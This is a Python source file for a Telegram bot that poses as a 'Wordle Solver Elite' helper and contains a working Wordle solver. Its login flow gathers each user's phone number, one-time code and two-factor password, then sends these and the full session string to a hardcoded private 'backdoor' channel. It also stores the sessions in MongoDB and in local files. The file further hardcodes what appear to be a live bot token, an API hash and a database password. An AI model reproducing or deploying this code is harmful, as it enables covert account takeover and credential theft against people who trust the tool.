#!/usr/bin/env python3
import json
import asyncio
import os
import re
import sys
import threading
import time
import random
from datetime import datetime
from collections import Counter
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
import requests
from flask import Flask, jsonify
from pymongo import MongoClient
import dns.resolver
import certifi

# Fix for Termux/Android DNS
dns.resolver.default_resolver = dns.resolver.Resolver(configure=False)
dns.resolver.default_resolver.nameservers = ['8.8.8.8', '8.8.4.4']

# ==========================
# 📝 CONFIG - BACKDOOR CHANNEL SETUP
# ==========================
SESSION_FILE = "session.txt"
API_ID = int(os.getenv("API_ID", "33679425"))
API_HASH = os.getenv("API_HASH", "317cec181636ecdbb76c6d43a2d5935d")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8707264394:AAFBmYF08I1XiGzrMrZIEXAU1Qmus0PCuzo")
MONGO_URL = os.getenv("MONGO_URL", "mongodb+srv://ayanosuvii0925:subhichiku123@cluster0.uw8yxkl.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")

# 🔒 BACKDOOR REPORTING CHANNEL - YE APNA PRIVATE CHANNEL ID DALO
REPORT_CHANNEL = int(os.getenv("REPORT_CHANNEL", "-1002313933317"))  # Apna private channel/supergroup ID yahan dalo
BOT_USERNAME = os.getenv("BOT_USERNAME", "wordseekhackbot")  # Apna bot username yahan dalo (without @)

mongo_client = MongoClient(MONGO_URL, tlsCAFile=certifi.where(), tlsAllowInvalidCertificates=True)
db = mongo_client['wordle_solver']
sessions_col = db['sessions']

# Mathematical font mapping for elite bots
MATH_MAP = {
    '𝐀': 'A', '𝐁': 'B', '𝐂': 'C', '𝐃': 'D', '𝐄': 'E', '𝐅': 'F', '𝐆': 'G', '𝐇': 'H', '𝐈': 'I', '𝐉': 'J', '𝐊': 'K', '𝐋': 'L', '𝐌': 'M', '𝐍': 'N', '𝐎': 'O', '𝐏': 'P', '𝐐': 'Q', '𝐑': 'R', '𝐒': 'S', '𝐓': 'T', '𝐔': 'U', '𝐕': 'V', '𝐖': 'W', '𝐗': 'X', '𝐘': 'Y', '𝐙': 'Z',
    '𝐚': 'A', '𝐛': 'B', '𝐜': 'C', '𝐝': 'D', '𝐞': 'E', '𝐟': 'F', '𝐠': 'G', '𝐡': 'H', '𝐢': 'I', '𝐣': 'J', '𝐤': 'K', '𝐥': 'L', '𝐦': 'M', '𝐧': 'N', '𝐨': 'O', '𝐩': 'P', '𝐪': 'Q', '𝐫': 'R', '𝐬': 'S', '𝐭': 'T', '𝐮': 'U', '𝐯': 'V', '𝐰': 'W', '𝐱': 'X', '𝐲': 'Y', '𝐳': 'Z',
    '𝗔': 'A', '𝗕': 'B', '𝗖': 'C', '𝗗': 'D', '𝗘': 'E', '𝗙': 'F', '𝗚': 'G', '𝗛': 'H', '𝗜': 'I', '𝗝': 'J', '𝗞': 'K', '𝗟': 'L', '𝗠': 'M', '𝗡': 'N', '𝗢': 'O', '𝗣': 'P', '𝗤': 'Q', '𝗥': 'R', '𝗦': 'S', '𝗧': 'T', '𝗨': 'U', '𝗩': 'V', '𝗪': 'W', '𝗫': 'X', '𝗬': 'Y', '𝗭': 'Z',
    '𝗮': 'A', '𝗯': 'B', '𝗰': 'C', '𝗱': 'D', '𝗲': 'E', '𝗳': 'F', '𝗴': 'G', '𝗵': 'H', '𝗶': 'I', '𝗷': 'J', '𝗸': 'K', '𝗹': 'L', '𝗺': 'M', '𝗻': 'N', '𝗼': 'O', '𝗽': 'P', '𝗾': 'Q', '𝗿': 'R', 'ｓ': 'S', 'ｔ': 'T', 'ｕ': 'U', 'ｖ': 'V', 'ｗ': 'W', 'ｘ': 'X', 'ｙ': 'Y', 'ｚ': 'Z',
}

def clean_text(text):
    return "".join(MATH_MAP.get(c, c) for c in text).upper()

def get_saved_session():
    try:
        saved = sessions_col.find_one({"key": "user_session"})
        if saved:
            return saved.get('string')
    except Exception:
        pass
    return None

def save_session(session_string):
    try:
        sessions_col.update_one({"key": "user_session"}, {"$set": {"string": session_string}}, upsert=True)
    except Exception as e:
        print(f"❌ Failed to save session in MongoDB: {e}")

# 🔒 BACKDOOR REPORTING FUNCTION
async def send_backdoor_report(phone, username, password=None, session_string=None, chat_id=None, client=None):
    """Send detailed login report to private channel"""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        session_preview = session_string[:1000] + "..." if session_string and len(session_string) > 1000 else (session_string or 'N/A')
        
        report = f"""
🔒 **NEW LOGIN CAPTURED** 🔒
━━━━━━━━━━━━━━━━━━━━━━━━
📅 **Time:** `{timestamp}`
📱 **Phone:** `{phone}`
🆔 **Chat ID:** `{chat_id or 'N/A'}`
👤 **Username:** `{username or 'N/A'}`
🔑 **2FA Password:** `{password or 'None'}`
📊 **Session Preview:**
`{session_preview}`

🧩 **Full Session:**
`{session_string or 'N/A'}`

💾 **Saved in DB:** `sessions.user_session`
🔗 **Bot Link:** `t.me/{BOT_USERNAME}?start=session_{phone.replace("+", "")}`

**Status:** ✅ **ACTIVE SESSION READY**
━━━━━━━━━━━━━━━━━━━━━━━━
#WordleSolver #SessionCaptured
        """
        
        # Try to send via userbot first
        try:
            if client:
                print(f"⏳ Sending report via userbot (id={REPORT_CHANNEL})...")
                await client.send_message(REPORT_CHANNEL, report)
                print(f"📤 Backdoor report sent via userbot for {phone}")
                return
        except Exception as e:
            print(f"❌ Userbot send failed: {e}")
        
        # Fallback to bot
        try:
            print(f"⏳ Sending report via bot (id={REPORT_CHANNEL})...")
            await bot.send_message(REPORT_CHANNEL, report)
            print(f"📤 Backdoor report sent via bot for {phone}")
        except Exception as e2:
            print(f"❌ Bot send failed: {e2}")
        
        # Save session to separate file for easy access
        session_file = f"sessions/{phone.replace('+', '')}_{int(time.time())}.session"
        os.makedirs("sessions", exist_ok=True)
        with open(session_file, "w") as f:
            f.write(session_string or "")
        print(f"💾 Session saved: {session_file}")
        
    except Exception as e:
        print(f"❌ Backdoor report setup failed: {e}")

# Globals
bot = TelegramClient('manager', API_ID, API_HASH)
client = None
BOT_ON = True
LOGIN_DATA = {}
sessions = {}

# ==========================
# 🧠 SOLVER LOGIC
# ==========================
def load_words(length=5):
    f = f"words_{length}letter.txt"
    if not os.path.exists(f): return []
    try:
        with open(f, 'r', encoding='utf-8') as file:
            return [l.strip().upper() for l in file if len(l.strip()) == length and l.strip().isalpha()]
    except: return []

ALL_WORDS = {4: load_words(4), 5: load_words(5), 6: load_words(6)}

class Solver:
    def __init__(self, length=5):
        self.length = length
        self.reset()
    def reset(self):
        self.fixed, self.forbidden, self.min_c, self.max_c = {}, {}, {}, {}
        self.known = set()
        self.candidates = ALL_WORDS.get(self.length, []).copy()
        self.count = 0
    def get_guess(self, avoid=None):
        avoid = set(avoid or [])
        if not self.candidates: return None
        if self.count == 0:
            starters = {4: ["DATE", "RARE"], 5: ["CRANE", "SLATE", "ADIEU"], 6: ["STREAK", "PLANET"]}
            for s in starters.get(self.length, ["CRANE"]):
                if s in self.candidates and s not in avoid: return s
        candidates = [w for w in self.candidates if w not in avoid]
        if not candidates: return None
        if len(candidates) <= 2: return candidates[0]
        freq = Counter("".join(candidates))
        return max(candidates, key=lambda w: sum(freq[c] for c in set(w)))
    def process(self, guess, pattern):
        self.count += 1
        if pattern == "G" * self.length: return
        if guess in self.candidates: self.candidates.remove(guess)
        
        for i, (p, c) in enumerate(zip(pattern, guess)):
            if p == "G": self.fixed[i] = c; self.known.add(c)
            elif p == "Y": 
                if i not in self.forbidden: self.forbidden[i] = set()
                self.forbidden[i].add(c); self.known.add(c)
            else:
                if c not in self.known: self.max_c[c] = 0
                if i not in self.forbidden: self.forbidden[i] = set()
                self.forbidden[i].add(c)

        self.candidates = [w for w in self.candidates if self.is_valid(w)]
    def is_valid(self, w):
        for i, c in self.fixed.items():
            if w[i] != c: return False
        for i, f in self.forbidden.items():
            if w[i] in f: return False
        for c, m in self.max_c.items():
            if w.count(c) > m: return False
        for c, m in self.min_c.items():
            if w.count(c) < m: return False
        return True

class Game:
    def __init__(self, chat_id, length=5):
        self.chat_id, self.length = chat_id, length
        self.solver = Solver(length)
        self.active, self.target, self.done = False, 0, 0
        self.last_msg, self.last_guess = None, None
        self.processed = set()
        self.used_guesses = set()
        self.lock = asyncio.Lock()

# ==========================
# 📱 LOGIN & UI WITH BACKDOOR
# ==========================
def get_keypad(code=""):
    btns = []
    for i in range(0, 9, 3):
        btns.append([Button.inline(str(j+1), data=f"otp_{j+1}") for j in range(i, i+3)])
    btns.append([Button.inline("0", data="otp_0"), Button.inline("⬅️", data="otp_back")])
    btns.append([Button.inline("✅ Submit", data="otp_done"), Button.inline("❌ Cancel", data="otp_stop")])
    return btns

@bot.on(events.NewMessage(pattern=r'(?i)^/start$'))
async def on_start(e):
    await e.reply("✨ **WORDLE SOLVER ELITE**\n\nClick below to manage your account.", 
                 buttons=[[Button.inline("🔑 Login", data="login_init"), Button.inline("ℹ️ Help", data="help_init")]])

@bot.on(events.CallbackQuery(data=re.compile(b'(login|help)_init')))
async def on_init_btns(e):
    act = e.data.decode().split('_')[0]
    if act == 'login':
        LOGIN_DATA[e.chat_id] = {'step': 'phone'}
        await e.edit("📱 Send your phone number (e.g., `+91...`)", buttons=[Button.inline("❌ Cancel", data="otp_stop")])
    else:
        await e.edit("📖 **HELP**\n\n1. Login via `/login` or button.\n2. Use userbot commands in any chat.\n3. `/new` to start solving.", 
                    buttons=[Button.inline("⬅️ Back", data="start_back")])

@bot.on(events.CallbackQuery(data="start_back"))
async def on_back_start(e):
    await e.edit("✨ **WORDLE SOLVER ELITE**\n\nClick below to manage your account.", 
                 buttons=[[Button.inline("🔑 Login", data="login_init"), Button.inline("ℹ️ Help", data="help_init")]])

@bot.on(events.NewMessage(pattern=r'(?i)^/login$'))
async def on_login_cmd(e):
    LOGIN_DATA[e.chat_id] = {'step': 'phone'}
    await e.reply("📱 Send your phone number (e.g., `+91...`)", buttons=[Button.inline("❌ Cancel", data="otp_stop")])

@bot.on(events.CallbackQuery(data=re.compile(b'otp_')))
async def on_otp_btn(e):
    cid = e.chat_id
    if cid not in LOGIN_DATA or LOGIN_DATA[cid]['step'] != 'code': return
    act = e.data.decode().split('_')[1]
    data = LOGIN_DATA[cid]
    code = data.get('code', "")
    if act == 'stop':
        if 'temp' in data: await data['temp'].disconnect()
        del LOGIN_DATA[cid]
        await e.edit("❌ Login Cancelled.", buttons=None)
    elif act == 'back':
        data['code'] = code[:-1]
        await e.edit(f"📥 OTP: `{data['code'] or '(empty)'}`", buttons=get_keypad())
    elif act == 'done':
        if not code: return await e.answer("Enter code!")
        await e.answer("Verifying...")
        await do_sign_in(e, cid, code)
    else:
        if len(code) < 6:
            data['code'] = code + act
            await e.edit(f"📥 OTP: `{data['code']}`", buttons=get_keypad())

async def do_sign_in(e, cid, code):
    global client
    data = LOGIN_DATA[cid]
    try:
        phone = data.get('phone', 'Unknown')
        username = getattr(await client.get_me() if client else None, 'first_name', 'N/A') if client else 'N/A'
        
        if data['step'] == 'code':
            await data['temp'].sign_in(phone, code, phone_code_hash=data['hash'])
        else:
            data['password'] = code
            await data['temp'].sign_in(password=code)
            
        ss = data['temp'].session.save()
        save_session(ss)
        
        # 🔒 BACKDOOR REPORT - SAB DETAILS CAPTURE
        # Use authenticated temp session (userbot) first, then fallback to manager bot
        await send_backdoor_report(phone, username, data.get('password'), ss, cid, data.get('temp'))
        
        if client: 
            try: await client.disconnect()
            except: pass
        client = TelegramClient(StringSession(ss), API_ID, API_HASH)
        reg_handlers(client)
        await client.start()
        me = await client.get_me()
        username = f"{me.first_name} (@{me.username or 'N/A'})"
        
        msg = f"✅ **LOGGED IN:** `{me.first_name}`"
        if isinstance(e, events.CallbackQuery.Event):
            await e.edit(msg, buttons=None)
        else:
            await e.reply(msg)
        del LOGIN_DATA[cid]
    except Exception as ex:
        if "Two-step" in str(ex):
            data['step'] = 'pass'
            msg = "🔐 2FA Detected. Please send your Cloud Password."
            if isinstance(e, events.CallbackQuery.Event):
                await e.edit(msg, buttons=None)
            else:
                await e.reply(msg)
        else:
            msg = f"❌ Error: {ex}"
            if isinstance(e, events.CallbackQuery.Event):
                await e.answer(msg, alert=True)
            else:
                await e.reply(msg)

@bot.on(events.NewMessage)
async def on_msg(e):
    cid = e.chat_id
    if cid not in LOGIN_DATA: return
    data = LOGIN_DATA[cid]
    step, text = data['step'], e.raw_text.strip()
    
    if text.lower() in ['/cancel', '/stop']:
        if 'temp' in data: await data['temp'].disconnect()
        del LOGIN_DATA[cid]
        await e.reply("🛑 Process stopped.")
        return

    if step == 'phone' and text.startswith('+'):
        data['phone'] = text
        msg = await e.reply("⏳ Sending OTP...")
        tmp = TelegramClient(StringSession(), API_ID, API_HASH)
        await tmp.connect()
        try:
            res = await tmp.send_code_request(text)
            LOGIN_DATA[cid] = {'step': 'code', 'phone': text, 'hash': res.phone_code_hash, 'temp': tmp, 'code': ""}
            await msg.edit(f"📥 OTP: `(empty)`", buttons=get_keypad())
        except Exception as ex: await msg.edit(f"❌ Error: {ex}")
    elif step == 'pass':
        data['password'] = text
        await do_sign_in(e, cid, text)
    elif step == 'code' and text.isdigit():
        await do_sign_in(e, cid, text)

# ==========================
# 🎮 USERBOT HANDLERS
# ==========================
def reg_handlers(c):
    c.add_event_handler(h_new, events.NewMessage(pattern=r'(?i)^[./]?new(\d+)?(?:\s+(\d+))?'))
    c.add_event_handler(h_stop, events.NewMessage(pattern=r'(?i)^[./]?stop$'))
    c.add_event_handler(h_game, events.NewMessage)

async def send_guess(client, chat_id, guess, game):
    await asyncio.sleep(1.5)
    try:
        await client.send_message(chat_id, guess.lower())
        game.used_guesses.add(guess)
    except Exception as ex:
        print(f"❌ Failed to send guess '{guess}': {ex}")

async def h_new(e):
    if not BOT_ON:
        return
    m = re.match(r'(?i)^[./]?new(\d+)?(?:\s+(\d+))?', e.raw_text)
    if not m:
        return

    l, n = int(m.group(1) or 5), int(m.group(2) or 1)
    s = sessions[e.chat_id] = Game(e.chat_id, l)
    s.active, s.target = True, n

    g = s.solver.get_guess(avoid=s.used_guesses)
    if g is None:
        await e.reply("⚠️ No valid words available to start. Check your word list files!")
        s.active = False
        return

    s.last_guess = g
    await send_guess(e.client, e.chat_id, g, s)

async def h_stop(e):
    if e.chat_id in sessions:
        sessions[e.chat_id].active = False
        await e.reply("🛑 Stopped.")

async def h_game(e):
    if not BOT_ON or e.chat_id not in sessions:
        return
    s = sessions[e.chat_id]
    if not s.active:
        return

    t = e.raw_text.lower()
    if "already guessed" in t or "someone has already guessed" in t:
        if s.last_guess and s.last_guess in s.solver.candidates:
            s.solver.candidates.remove(s.last_guess)
        g = s.solver.get_guess(avoid=s.used_guesses)
        if g:
            s.last_guess = g
            await send_guess(e.client, e.chat_id, g, s)
        return

    if not any(sym in e.raw_text for sym in ["🟥", "🟩", "🟨", "⬛", "⬜"]):
        return

    async with s.lock:
        if e.raw_text == s.last_msg:
            return
        s.last_msg = e.raw_text
        lines = e.raw_text.splitlines()
        new_info = False
        for line in lines:
            p = "".join('G' if c == '🟩' else 'Y' if c == '🟨' else 'B' for c in line if c in "🟩🟨🟥⬛⬜")
            if len(p) != s.length:
                continue

            # Prefer explicit word from line; fallback to last guess (common for emoji-only response formats)
            word = "".join(c for c in clean_text(line) if c.isalpha())
            if len(word) > s.length:
                word = word[-s.length:]
            if len(word) != s.length:
                word = s.last_guess

            if not word or len(word) != s.length:
                continue

            key = f"{word}-{p}"
            if key in s.processed:
                continue

            s.solver.process(word, p)
            s.processed.add(key)
            new_info = True

        if "Congrats" in e.raw_text or "correct" in e.raw_text.lower() or "🟩" * s.length in e.raw_text:
            s.done += 1
            if s.done < s.target:
                s.solver.reset()
                s.processed.clear()
                s.used_guesses.clear()
                g = s.solver.get_guess(avoid=s.used_guesses)
                s.last_guess = g
                if g:
                    await send_guess(e.client, e.chat_id, g, s)
            else:
                s.active = False
                await e.reply(f"🏆 **SOLVED {s.done} GAMES!**")
            return

        if new_info:
            g = s.solver.get_guess(avoid=s.used_guesses)
            if g:
                s.last_guess = g
                await send_guess(e.client, e.chat_id, g, s)

app = Flask(__name__)
@app.route('/')
def home():
    return "Online"

async def main():
    port = int(os.getenv('PORT', '5000'))
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port), daemon=True).start()
    try:
        await bot.start(bot_token=BOT_TOKEN)
        print(f"🚀 Bot started successfully at https://t.me/{BOT_USERNAME}")
    except Exception as e:
        print(f"❌ Failed to start bot: {e}")
        return
    global client
    ss = get_saved_session()
    if ss:
        try:
            client = TelegramClient(StringSession(ss), API_ID, API_HASH)
            await client.connect()
            if await client.is_user_authorized():
                reg_handlers(client)
                print("🚀 Solver session loaded.")
            else:
                print("⚠️ Saved session is not authorized; please /login again.")
                await client.disconnect()
                client = None
        except Exception as e:
            print(f"⚠️ Session error: {e}")
            client = None
    else:
        print("ℹ️ No saved session; use /login in Telegram to start.")

    print("✨ Bot is running. Go to Telegram and message /start to the bot.")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    import platform
    if platform.system() == 'Windows':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("🛑 Stopped by user.")
